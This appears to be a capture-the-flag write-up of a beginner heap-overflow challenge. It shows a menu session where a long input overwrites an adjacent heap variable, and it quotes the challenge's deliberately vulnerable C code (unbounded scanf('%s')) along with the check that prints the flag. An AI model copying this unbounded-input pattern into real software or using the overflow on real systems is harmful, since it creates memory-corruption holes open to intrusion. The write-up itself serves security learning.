Sovled by entering a long string.  Need to overflow the buffer.

Each string has an pointer address that is next to each other thanks to the malloc.  Malloc appears to five 32 bytes as shown by entering the string below.

```
Enter your choice: 2
Data for buffer: 1234567890123456789012345678901234567890

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55c00c6572b0  ->   1234567890123456789012345678901234567890
+-------------+----------------+
[*]   0x55c00c6572d0  ->   34567890
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 
```

There is no write check when writting the data to the buffer:

```c
void write_buffer()
{
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

If the safe_var is not "bico" then it will print the flag:

```c
void check_win()
{
    if (strcmp(safe_var, "bico") != 0)
    {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    }
    else
    {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
